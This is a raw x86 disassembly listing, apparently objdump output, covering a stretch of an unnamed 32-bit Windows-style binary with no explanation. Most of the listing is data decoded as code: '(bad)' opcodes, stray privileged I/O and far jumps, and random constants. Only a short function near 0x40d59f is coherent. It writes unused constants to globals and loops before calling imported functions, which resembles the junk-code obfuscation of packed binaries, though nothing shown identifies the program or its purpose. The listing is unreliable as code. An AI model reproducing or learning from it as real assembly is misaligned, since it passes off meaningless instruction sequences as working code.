  40d242:	ins    BYTE PTR es:[edi],dx
  40d243:	cld    
  40d244:	xor    bl,BYTE PTR [ebp-0x42811883]
  40d24a:	imul   ecx,DWORD PTR [edx+0x4c],0xd37935f8
  40d251:	sti    
  40d252:	iret   
  40d253:	test   al,0x46
  40d255:	iret   
  40d256:	dec    ecx
  40d257:	adc    edi,edx
  40d259:	aam    0x1e
  40d25b:	aad    0x2c
  40d25d:	or     al,0x62
  40d25f:	imul   DWORD PTR [edi+0x6181b973]
  40d265:	ja     0x40d231
  40d267:	add    BYTE PTR [edx+0x284525a9],dh
  40d26d:	rol    BYTE PTR [esi+0x5d],cl
  40d270:	add    BYTE PTR [ebp+0x23f1f1],cl
  40d276:	cmp    bl,al
  40d278:	push   0x2e315a39
  40d27d:	mov    bh,al
  40d27f:	xor    DWORD PTR [ecx+0x6d],edi
  40d282:	fs and eax,0x3f7b53bd
  40d288:	pop    edi
  40d289:	jns    0x40d278
  40d28b:	clc    
  40d28c:	jae    0x40d273
  40d28e:	mov    bh,BYTE PTR [edi+0x7a]
  40d291:	popf   
  40d292:	xor    DWORD PTR [edi-0x87237a2],esp
  40d298:	icebp  
  40d299:	data16 seto BYTE PTR [eax+edi*1-0x7f]
  40d29f:	mov    edx,0x2359fd0b
  40d2a4:	mov    ss,WORD PTR [ecx+edi*4+0x19e96bd5]
  40d2ab:	mov    esp,0xc8c8f27a
  40d2b0:	scas   al,BYTE PTR es:[edi]
  40d2b1:	test   al,0x6c
  40d2b3:	lods   eax,DWORD PTR ds:[esi]
  40d2b4:	out    0xcc,al
  40d2b6:	and    al,0x8a
  40d2b8:	sub    ecx,ecx
  40d2ba:	and    edi,DWORD PTR [ebp+edi*1-0x33]
  40d2be:	out    0x12,eax
  40d2c0:	cmp    cl,BYTE PTR [ebx]
  40d2c2:	inc    ebp
  40d2c3:	mov    esi,0xe6ae2d2d
  40d2c8:	mov    edi,0x50254e13
  40d2cd:	push   DWORD PTR [ebp+0x59]
  40d2d0:	sahf   
  40d2d1:	or     eax,0xb2dc4570
  40d2d6:	mov    ds:0xba0888a0,al
  40d2db:	mov    WORD PTR [ebx+ebp*2-0x4d],?
  40d2df:	iret   
  40d2e0:	out    0xe3,al
  40d2e2:	cwde   
  40d2e3:	or     al,0x51
  40d2e5:	lods   eax,DWORD PTR ds:[esi]
  40d2e6:	mov    eax,ds:0xb9faeaea
  40d2eb:	call   0x9f8545f0
  40d2f0:	clc    
  40d2f1:	ss loope 0x40d2c8
  40d2f4:	sbb    cl,BYTE PTR [ebx-0x72]
  40d2f7:	div    dh
  40d2f9:	clc    
  40d2fa:	bound  ebp,QWORD PTR [ecx+0x59770da6]
  40d300:	inc    ebp
  40d301:	mov    dl,0x29
  40d303:	xchg   DWORD PTR [ebp+0xb92ac15],edi
  40d309:	sbb    DWORD PTR [ebp-0x3e],esi
  40d30c:	sahf   
  40d30d:	sbb    ah,bh
  40d30f:	daa    
  40d310:	jbe    0x40d378
  40d312:	lea    ebx,[esi+0x61]
  40d315:	in     al,dx
  40d316:	hlt    
  40d317:	dec    eax
  40d318:	mov    esp,DWORD PTR [edi]
  40d31a:	out    dx,eax
  40d31b:	push   es
  40d31c:	add    eax,0x4824ce22
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	mov    esi,0xb05c1555
  40d33d:	xchg   edi,eax
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	pop    edi
  40d345:	cs sbb al,dh
  40d348:	xlat   BYTE PTR ds:[ebx]
  40d349:	out    0x1c,al
  40d34b:	sbb    ebp,esp
  40d34d:	xor    ah,BYTE PTR [esi]
  40d34f:	inc    esp
  40d350:	dec    edx
  40d351:	jge    0x40d357
  40d353:	clc    
  40d354:	lods   al,BYTE PTR ds:[esi]
  40d355:	fisubr WORD PTR [eax-0x53]
  40d358:	mov    eax,0x2afd193f
  40d35d:	jmp    0x40d354
  40d35f:	cmp    BYTE PTR [edx],0x6e
  40d362:	jae    0x40d33f
  40d364:	in     eax,0xcd
  40d366:	or     bh,BYTE PTR [esi+0x78]
  40d369:	push   eax
  40d36a:	xchg   esi,eax
  40d36b:	ins    DWORD PTR es:[edi],dx
  40d36c:	jae    0x40d35a
  40d36e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d36f:	inc    edi
  40d370:	(bad)  
  40d372:	mov    esp,0x790d566c
  40d377:	add    DWORD PTR [ebx+eiz*2-0x19a5be53],ecx
  40d37e:	aam    0x58
  40d380:	jp     0x40d365
  40d382:	or     DWORD PTR [esi+eiz*1+0x3a27c90b],ecx
  40d389:	mov    ebp,0x27abab9f
  40d38e:	dec    ebx
  40d38f:	cmp    eax,0x98b28b95
  40d394:	jmp    0x74300393
  40d399:	(bad)  
  40d39b:	jmp    0x27fb:0x7ad699f0
  40d3a2:	jmp    0x2c1:0xd0b66155
  40d3a9:	xor    al,0xed
  40d3ab:	sub    ebp,ebx
  40d3ad:	inc    ebp
  40d3ae:	xchg   ebx,eax
  40d3af:	cmp    ebx,DWORD PTR [esi+0x8]
  40d3b2:	cwde   
  40d3b3:	adc    BYTE PTR ds:0x4a11a996,bh
  40d3b9:	and    DWORD PTR [ebx+0x33],edi
  40d3bc:	hlt    
  40d3bd:	pop    ebx
  40d3be:	imul   esp,DWORD PTR [ecx+0x7ad35093],0x9b2edc7a
  40d3c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3c9:	fld    QWORD PTR [esi]
  40d3cb:	mov    esi,0xc5ac8804
  40d3d0:	adc    eax,0x85675ceb
  40d3d5:	jmp    FWORD PTR [ecx-0x39]
  40d3d8:	sub    BYTE PTR fs:[edi+0x11703459],ah
  40d3df:	mov    cs,WORD PTR [ebp+eax*2-0x5d]
  40d3e3:	je     0x40d446
  40d3e5:	leave  
  40d3e6:	jo     0x40d424
  40d3e8:	push   ss
  40d3e9:	cmp    BYTE PTR [eax],al
  40d3eb:	cmp    DWORD PTR [edi],0xffffffa3
  40d3ee:	mov    ecx,0x83e758db
  40d3f3:	imul   ebx,edx,0x77
  40d3f6:	mov    ebp,0xbc075a29
  40d3fb:	jae    0x40d47c
  40d3fd:	int3   
  40d3fe:	dec    edi
  40d3ff:	inc    eax
  40d400:	arpl   WORD PTR [ecx+0x7e047ec],sp
  40d406:	fild   QWORD PTR [ebp+esi*1+0x1c]
  40d40a:	daa    
  40d40b:	sbb    al,0x49
  40d40d:	jno    0x40d47a
  40d40f:	shl    BYTE PTR [ebx+edi*4-0x58],0x1
  40d414:	pop    edx
  40d415:	jg     0x40d449
  40d417:	and    al,0xcd
  40d419:	je     0x40d422
  40d41b:	lods   al,BYTE PTR ds:[esi]
  40d41c:	in     eax,0xd9
  40d41e:	xchg   esp,edi
  40d420:	sub    ah,dl
  40d422:	(bad)  
  40d423:	push   edx
  40d424:	xor    eax,edx
  40d426:	cmp    DWORD PTR [ebx+0x2c],ebx
  40d429:	and    esi,esi
  40d42b:	xor    DWORD PTR [edx+edx*2-0x80],edi
  40d42f:	stos   BYTE PTR es:[edi],al
  40d430:	stos   BYTE PTR es:[edi],al
  40d431:	sub    dh,BYTE PTR [edx-0x30be3a99]
  40d437:	mov    eax,0xdf63f05c
  40d43c:	lods   al,BYTE PTR ds:[esi]
  40d43d:	inc    ebx
  40d43e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d43f:	pop    eax
  40d440:	scas   al,BYTE PTR es:[edi]
  40d441:	int    0x99
  40d443:	sbb    eax,0xd2731034
  40d448:	add    BYTE PTR [eax+esi*1-0x6d],bh
  40d44c:	gs scas al,BYTE PTR es:[edi]
  40d44e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d44f:	je     0x40d44b
  40d451:	fbstp  TBYTE PTR [edi+0x418fe169]
  40d457:	xchg   ecx,eax
  40d458:	mov    al,ds:0x61dbe3f7
  40d45d:	add    eax,0x5e43b785
  40d462:	push   cs
  40d463:	or     DWORD PTR [ecx],0xffffff8a
  40d466:	bnd jno 0x40d412
  40d469:	mov    al,0xca
  40d46b:	mov    ebp,0x67a66827
  40d470:	inc    ecx
  40d471:	pop    eax
  40d472:	push   edx
  40d473:	and    BYTE PTR [edx+0x572c0cd0],dh
  40d479:	mov    ch,0x5d
  40d47b:	xchg   edx,eax
  40d47c:	inc    edi
  40d47d:	popa   
  40d47e:	stc    
  40d47f:	jae    0x40d406
  40d481:	arpl   WORD PTR [ebp-0x78],cx
  40d484:	arpl   WORD PTR [ecx+0x12f1db],bp
  40d48a:	les    esi,FWORD PTR [edx+ebp*8-0x7ad68dbc]
  40d491:	bound  ecx,QWORD PTR [edi]
  40d493:	bnd jl 0x40d46d
  40d496:	jl     0x40d4c0
  40d498:	into   
  40d499:	sub    ch,BYTE PTR [ecx+0x53c9cd]
  40d49f:	sbb    al,0x63
  40d4a1:	neg    bl
  40d4a3:	mov    al,ds:0x144def7c
  40d4a8:	leave  
  40d4a9:	adc    BYTE PTR [esi],al
  40d4ab:	ret    0x34d2
  40d4ae:	sub    DWORD PTR [bp+si-0x54],0x9cbf2e5
  40d4b6:	push   ecx
  40d4b7:	clc    
  40d4b8:	jmp    0x40d4f4
  40d4ba:	sbb    al,0x4d
  40d4bc:	sbb    eax,DWORD PTR [eax-0x258f0073]
  40d4c2:	test   al,0xfd
  40d4c4:	adc    BYTE PTR [esi],ah
  40d4c6:	xchg   ecx,eax
  40d4c7:	jmp    0x40d47d
  40d4c9:	rol    ah,cl
  40d4cb:	and    eax,0x9834cdcc
  40d4d0:	ret    
  40d4d1:	push   ebx
  40d4d2:	rcl    ah,cl
  40d4d4:	xchg   ecx,eax
  40d4d5:	mov    bh,0x0
  40d4d7:	adc    eax,0x39709923
  40d4dc:	xor    DWORD PTR [ebx],eax
  40d4de:	mov    esp,0x50a02045
  40d4e3:	mov    ds:0x3bb61834,al
  40d4e8:	call   0xdc8e9eeb
  40d4ed:	fcomp  QWORD PTR [ebp-0x9]
  40d4f0:	pop    eax
  40d4f1:	mov    ecx,0xb7375a55
  40d4f6:	push   0x152cb52a
  40d4fb:	aad    0xca
  40d4fd:	test   eax,0xa9cd9693
  40d502:	dec    edx
  40d503:	(bad)  
  40d504:	push   ecx
  40d505:	cmc    
  40d506:	aas    
  40d507:	xchg   ah,bl
  40d509:	fwait
  40d50a:	(bad)  
  40d50b:	xor    al,0xb2
  40d50d:	push   ebx
  40d50e:	inc    ebx
  40d50f:	push   0xffffffa4
  40d511:	inc    esi
  40d512:	nop
  40d513:	sub    ch,BYTE PTR [edx]
  40d515:	cmp    esp,DWORD PTR [edx]
  40d517:	arpl   WORD PTR [ecx],si
  40d519:	inc    esp
  40d51a:	pop    ebp
  40d51b:	stos   BYTE PTR es:[edi],al
  40d51c:	xchg   ebx,eax
  40d51d:	iret   
  40d51e:	xor    al,0xaf
  40d520:	rcl    BYTE PTR [edi-0x1971bc94],0x74
  40d527:	xchg   ebx,eax
  40d528:	mov    ecx,DWORD PTR ds:0x1d88f084
  40d52e:	xacquire xchg DWORD PTR [ebp-0x8e73f1b],edi
  40d535:	adc    eax,0xd79cef1c
  40d53a:	jb     0x40d5b3
  40d53c:	adc    dh,0x78
  40d53f:	test   DWORD PTR [ebx-0x7d],0x37fd8112
  40d546:	repz push esi
  40d548:	and    eax,0xadcb367f
  40d54d:	sbb    al,0xa4
  40d54f:	and    DWORD PTR [esi-0x744c5dc7],0x6d
  40d556:	mov    ds:0x4e8db68c,eax
  40d55b:	in     al,dx
  40d55c:	sti    
  40d55d:	test   DWORD PTR [eax+0x3e7282b1],eax
  40d563:	daa    
  40d564:	and    al,0x43
  40d566:	ja     0x40d54a
  40d568:	sti    
  40d569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d56a:	test   eax,edi
  40d56c:	mov    cl,0x65
  40d56e:	in     al,dx
  40d56f:	ret    
  40d570:	mov    ds:0x14071f69,al
  40d575:	lahf   
  40d576:	mov    dl,0x64
  40d578:	jge    0x40d524
  40d57a:	push   es
  40d57b:	gs sub al,0x92
  40d57e:	sbb    bh,BYTE PTR [edx-0x43]
  40d581:	xchg   esp,eax
  40d582:	arpl   WORD PTR es:[esi+0x6b],ax
  40d586:	cmp    BYTE PTR [edi+0x3433d00],ah
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4336a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433697,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43369b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4336a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4336e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43369b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433727,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43372f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43365b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4336db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433717,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433717
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433717,edx
  40d64f:	cmp    DWORD PTR ds:0x433717,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433717,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433663,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433663
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433663,edx
  40d68b:	cmp    DWORD PTR ds:0x433663,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433753
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433663,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433667
  40d6b7:	add    eax,DWORD PTR ds:0x43369b
  40d6bd:	mov    ds:0x433667,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x25a0482a
  40d6f9:	inc    esi
  40d6fa:	(bad)  
  40d6fb:	jg     0x40d777
  40d6fd:	xchg   edx,eax
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d703
  40d705:	ins    BYTE PTR es:[edi],dx
  40d706:	xchg   esp,eax
  40d707:	aaa    
  40d708:	inc    edi
  40d709:	jbe    0x40d70d
  40d70b:	lds    ebp,FWORD PTR [edx+0x36]
  40d70e:	cmp    ecx,DWORD PTR ds:0x48ae600e
  40d714:	xor    al,0xd5
  40d716:	jge    0x40d788
  40d718:	cli    
  40d719:	lods   al,BYTE PTR ds:[esi]
  40d71a:	mov    DWORD PTR [edx-0x9],edi
  40d71d:	xor    eax,0x9ba23155
  40d722:	xchg   BYTE PTR [esi-0xedeb26],cl
  40d728:	sub    esi,DWORD PTR [ecx]
  40d72a:	push   esi
  40d72b:	xlat   BYTE PTR ds:[ebx]
  40d72c:	cmp    edi,edx
  40d72e:	dec    edx
  40d72f:	push   esp
  40d730:	mov    al,ds:0x5f0cc028
  40d735:	adc    DWORD PTR [edi-0x64464931],eax
  40d73b:	push   ebx
  40d73c:	push   esi
  40d73d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d73e:	add    eax,0x18b76ff0
  40d743:	mov    ch,0x3
  40d745:	sub    eax,0x9093425e
  40d74a:	aaa    
  40d74b:	fs push ax
  40d74e:	sahf   
  40d74f:	adc    eax,0xb872afc5
  40d754:	pop    eax
  40d755:	sub    edx,DWORD PTR ds:0xf36312da
  40d75b:	pop    ebp
  40d75c:	mov    bl,0xb0
  40d75e:	xchg   edx,eax
  40d75f:	lock inc ebp
  40d761:	jo     0x40d729
  40d763:	test   esp,ebx
  40d765:	inc    esp
  40d766:	cmp    BYTE PTR [ebp+0x1f7273aa],dl
  40d76c:	shr    DWORD PTR [esi+0x37],cl
  40d76f:	in     al,dx
  40d770:	mov    bl,0xa8
  40d772:	add    ecx,edi
  40d774:	cmp    ebp,eax
  40d776:	cmp    BYTE PTR [edi+0x5011f4a],dh
  40d77c:	mov    ds:0x3c877fdc,eax
  40d781:	pop    ebx
  40d782:	outs   dx,BYTE PTR ds:[esi]
  40d783:	xor    BYTE PTR [ebp-0x73bf66ed],0xf
  40d78a:	xchg   esi,eax
  40d78b:	mov    al,ds:0xd7dc9d59
  40d790:	clc    
  40d791:	cld    
  40d792:	call   0x279:0x43f6bdcf
  40d799:	pop    ds
  40d79a:	jns    0x40d808
  40d79c:	fsubp  st(3),st
  40d79e:	retf   
  40d79f:	jnp    0x40d7ff
  40d7a1:	dec    eax
  40d7a2:	pop    ds
  40d7a3:	lahf   
  40d7a4:	mov    bh,0xe6
  40d7a6:	retf   
  40d7a7:	test   eax,0xa294f6b8
  40d7ac:	pop    es
  40d7ad:	mov    BYTE PTR [ecx+0x1f543c68],ch
  40d7b3:	push   0x416c81d3
  40d7b8:	imul   ebx,esi,0xa87e39a7
  40d7be:	adc    al,BYTE PTR [esi]
  40d7c0:	fdiv   QWORD PTR [edi+0x73]
  40d7c3:	pop    esi
  40d7c4:	push   edi
  40d7c5:	sbb    bl,BYTE PTR [ebx]
  40d7c7:	push   esp
  40d7c8:	jne    0x40d754
  40d7ca:	fwait
  40d7cb:	adc    DWORD PTR [edx],edi
  40d7cd:	hlt    
  40d7ce:	test   eax,0x2f29bde5
  40d7d3:	cmp    edi,ecx
  40d7d5:	fcmovnu st,st(7)
  40d7d7:	and    eax,0xf8617433
  40d7dc:	sub    dh,BYTE PTR [esi+ecx*8+0x123d31fe]
  40d7e3:	std    
  40d7e4:	popa   
  40d7e5:	jmp    0x6b18:0xb30b69f9
  40d7ec:	sahf   
  40d7ed:	ins    DWORD PTR es:[edi],dx
  40d7ee:	mov    cl,0xb1
  40d7f0:	inc    ecx
  40d7f1:	imul   eax,DWORD PTR [edx+0x42],0x99b252d4
  40d7f8:	jmp    0x40d830
  40d7fa:	ja     0x40d815
  40d7fc:	xchg   BYTE PTR [eax-0x8],bh
  40d7ff:	sub    DWORD PTR [ecx+esi*4+0x1a],eax
  40d803:	cmp    dh,0x29
  40d806:	mov    dh,0x9a
  40d808:	pop    eax
  40d809:	in     eax,0xb4
  40d80b:	cmp    DWORD PTR [ebp+0x3],ebp
  40d80e:	mov    cl,0x1a
  40d810:	mov    esp,0x4f5a702a
  40d815:	popa   
  40d816:	shl    ebp,0xb6
  40d819:	xor    al,0xd8
  40d81b:	mov    WORD PTR [ecx+0x81c08b2],?
  40d821:	push   ebx
  40d822:	aam    0xa0
  40d824:	loop   0x40d7c8
  40d826:	sub    eax,0x7afe69b4
  40d82b:	sbb    al,0x30
  40d82d:	mov    eax,ds:0xa1cc0819
  40d832:	mov    BYTE PTR [ecx],cl
  40d834:	sub    BYTE PTR [eax+0x25],bh
  40d837:	mov    edx,0x74e87753
  40d83c:	sub    DWORD PTR [ecx+0x29811164],ecx
  40d842:	mov    edx,esi
  40d844:	fcom   DWORD PTR [edi]
  40d846:	out    0x16,eax
  40d848:	iret   
  40d849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d84a:	and    dh,BYTE PTR [edi]
  40d84c:	je     0x40d7d6
  40d84e:	or     al,BYTE PTR [eax+0x2e21f18b]
  40d854:	push   0x62
  40d856:	adc    ebx,DWORD PTR [esi+0x7e50f3f4]
  40d85c:	ins    BYTE PTR es:[edi],dx
  40d85d:	call   0x7982:0x90fc3399
  40d864:	add    DWORD PTR [ebp-0x67],ebp
  40d867:	mov    ebp,0x66be1d29
  40d86c:	and    eax,0xe94d10d
  40d871:	push   ss
  40d872:	test   BYTE PTR [ebx-0x3b],dl
  40d875:	adc    eax,0xc4001612
  40d87a:	lock out dx,eax
  40d87c:	pop    ecx
  40d87d:	jne    0x40d818
  40d87f:	jg     0x40d8a9
  40d881:	dec    eax
  40d882:	push   eax
  40d883:	mov    ds:0x497459e7,al
  40d888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d889:	and    BYTE PTR [ecx+edi*8],al
  40d88c:	(bad)  
  40d88d:	cmp    bl,BYTE PTR [esi-0x2e]
  40d890:	in     al,0xad
  40d892:	lea    esi,[edx]
  40d894:	(bad)  
  40d895:	popa   
  40d896:	out    0x98,al
  40d898:	mov    ecx,DWORD PTR [esi+0x4c]
  40d89b:	outs   dx,DWORD PTR ss:[esi]
  40d89d:	aam    0xfa
  40d89f:	(bad)  
  40d8a0:	cwde   
  40d8a1:	jae    0x40d827
  40d8a3:	mov    al,0x6c
  40d8a5:	pop    es
  40d8a6:	shr    BYTE PTR [ebx],1
  40d8a8:	or     eax,DWORD PTR ds:0x233c5d41
  40d8ae:	xor    al,0x34
  40d8b0:	pusha  
  40d8b1:	xchg   esi,eax
  40d8b2:	mov    ecx,DWORD PTR [edi-0x7415e7f7]
  40d8b8:	js     0x40d932
  40d8ba:	mov    ds:0x17c1f2e7,eax
  40d8bf:	jb     0x40d8d7
  40d8c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8c2:	xchg   DWORD PTR [edi+0x637b57f6],ecx
  40d8c8:	add    dl,BYTE PTR [ebx+0xcd16a4a]
  40d8ce:	lods   al,BYTE PTR ds:[esi]
  40d8cf:	lods   al,BYTE PTR ds:[esi]
  40d8d0:	mov    ebp,0xaa063340
  40d8d5:	xor    eax,0xdc5b3ef8
  40d8da:	es inc ecx
  40d8dc:	nop
  40d8dd:	outs   dx,DWORD PTR ds:[esi]
  40d8de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8df:	aaa    
  40d8e0:	gs imul ecx,esp,0x2396f845
  40d8e7:	xor    bl,BYTE PTR [ebx+0x461e7a57]
  40d8ed:	out    dx,al
  40d8ee:	jmp    0x40d897
  40d8f0:	sub    al,0xf2
  40d8f2:	mul    edi
  40d8f4:	push   ebx
  40d8f5:	(bad)  
  40d8f6:	and    bh,BYTE PTR [esp+ebx*4-0x6f]
  40d8fa:	aaa    
  40d8fb:	(bad)  
  40d8fd:	pop    ebx
  40d8fe:	inc    ecx
  40d8ff:	push   edi
  40d900:	ins    DWORD PTR es:[edi],dx
  40d901:	aam    0x7e
  40d903:	add    al,0x34
  40d905:	repnz out 0x39,al
  40d908:	add    eax,ebx
  40d90a:	out    0xa8,eax
  40d90c:	test   BYTE PTR [edi-0x4f6bc477],ch
  40d912:	mov    ebx,0xc8ddedab
  40d917:	test   BYTE PTR [esi-0x78],bl
  40d91a:	popf   
  40d91b:	dec    ebp
  40d91c:	outs   dx,BYTE PTR ds:[esi]
  40d91d:	add    eax,0x9dccabd8
  40d922:	jp     0x40d9a3
  40d924:	sbb    BYTE PTR [eax-0x15],dl
  40d927:	pop    ebx
  40d928:	cld    
  40d929:	cmp    esp,DWORD PTR [eax]
  40d92b:	ret    0xd2e5
  40d92e:	dec    eax
  40d92f:	stos   DWORD PTR es:[edi],eax
  40d930:	enter  0x49cc,0x6d
  40d934:	push   es
  40d935:	xchg   dl,bh
  40d937:	nop
  40d938:	(bad)  
  40d939:	bnd jge 0x40d97c
  40d93c:	jae    0x40d8ce
  40d93e:	or     BYTE PTR [edx],bl
  40d940:	loopne 0x40d920
  40d942:	cmp    ebp,DWORD PTR [edx-0x77]
  40d945:	add    DWORD PTR [ebx-0xd1607bb],ecx
  40d94b:	add    al,0x0
  40d94d:	add    BYTE PTR [ebx+0x4d8bfc45],cl
  40d953:	adc    BYTE PTR [ebx],dh
  40d955:	mov    DWORD PTR [ebx],0x258e9c6
  40d95b:	add    BYTE PTR [eax],al
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xf62b51ed
  40d96a:	aam    0xa4
  40d96c:	sar    DWORD PTR [edx],cl
  40d96e:	nop
  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d92a
  40d976:	imul   edi,edx,0x3d
  40d979:	sub    eax,0xe4ad8c79
  40d97e:	repnz aaa 
  40d980:	or     bl,al
  40d982:	inc    eax
  40d983:	sub    DWORD PTR [ecx+eax*2+0x38],ebp
  40d987:	and    bl,bh
  40d989:	cmp    edi,eax
  40d98b:	jl     0x40d91f
  40d98d:	aas    
  40d98e:	dec    ebx
  40d98f:	(bad)  
  40d990:	mov    ds:0x40d383d8,al
  40d995:	scas   eax,DWORD PTR es:[edi]
  40d996:	inc    edx
  40d997:	(bad)  
  40d998:	lock adc eax,0x15432cea
  40d99e:	fsubr  QWORD PTR [edi+0x61]
  40d9a1:	inc    ecx
  40d9a2:	and    al,0xb0
  40d9a4:	mov    fs,WORD PTR [ebp+0x43]
  40d9a7:	outs   dx,DWORD PTR ds:[esi]
  40d9a8:	enter  0xb293,0x9c
  40d9ac:	das    
  40d9ad:	cmp    ebp,DWORD PTR [eax]
  40d9af:	adc    eax,DWORD PTR ss:[eax+0x172d6ed6]
  40d9b6:	(bad)  
  40d9b7:	jae    0x40d9a3
  40d9b9:	push   ebx
  40d9ba:	dec    ebx
  40d9bb:	sahf   
  40d9bc:	clc    
  40d9bd:	ins    DWORD PTR es:[edi],dx
  40d9be:	rol    edx,cl
  40d9c0:	(bad)  
  40d9c1:	retf   
  40d9c2:	outs   dx,BYTE PTR ds:[esi]
  40d9c3:	or     DWORD PTR [ecx-0x7f7f076a],esi
  40d9c9:	xchg   edi,eax
  40d9ca:	dec    ebp
  40d9cb:	pop    ds
  40d9cc:	xor    DWORD PTR [ebx],edx
  40d9ce:	retf   
  40d9cf:	or     bl,ah
  40d9d1:	or     BYTE PTR [edx+0x53959649],0x63
  40d9d8:	fdiv   QWORD PTR [edi+ebx*1+0x5e]
  40d9dc:	jo     0x40d98e
  40d9de:	(bad)  
  40d9e0:	dec    esp
  40d9e1:	jecxz  0x40d999
  40d9e3:	inc    ebp
  40d9e4:	inc    ecx
  40d9e5:	pushf  
  40d9e6:	inc    ebp
  40d9e7:	jecxz  0x40da42
  40d9e9:	sub    DWORD PTR [edi],ebp
  40d9eb:	ret    
  40d9ec:	fnsave [ebx-0x1b]
  40d9ef:	xor    DWORD PTR [edi-0x73],0x7d433c28
  40d9f6:	adc    BYTE PTR [esi+0x5924010b],ah
  40d9fc:	push   esi
  40d9fd:	repz mov dh,0xb7
  40da00:	adc    al,BYTE PTR cs:[ecx-0x42]
  40da04:	cli    
  40da05:	pushf  
  40da06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da07:	enter  0x5082,0x96
  40da0b:	push   sp
  40da0e:	das    
  40da0f:	sub    DWORD PTR [eax+eax*4+0x2fd2b42],0xffffff89
  40da17:	arpl   si,ax
  40da19:	std    
  40da1a:	outs   dx,DWORD PTR ds:[esi]
  40da1b:	sbb    BYTE PTR [esi],ah
  40da1d:	push   cs
  40da1e:	adc    DWORD PTR [ecx],ebx
  40da20:	mov    ch,BYTE PTR [eax+0x27]
  40da23:	dec    ebx
  40da24:	dec    eax
  40da25:	xchg   ecx,eax
  40da26:	aaa    
  40da27:	rol    DWORD PTR [ebx],cl
  40da29:	mov    ds:0x1096320c,al
  40da2e:	addr16 mov ch,0x25
  40da31:	add    al,bl
  40da33:	scas   eax,DWORD PTR es:[edi]
  40da34:	sbb    ch,BYTE PTR [esi-0x3e]
  40da37:	jge    0x40da61
  40da39:	jecxz  0x40da79
  40da3b:	stos   BYTE PTR es:[edi],al
  40da3c:	cmp    edx,edi
  40da3e:	sti    
  40da3f:	sbb    al,0xa3
  40da41:	pop    eax
  40da42:	loope  0x40da6c
  40da44:	mov    edi,0x81fec40a
  40da49:	inc    ebx
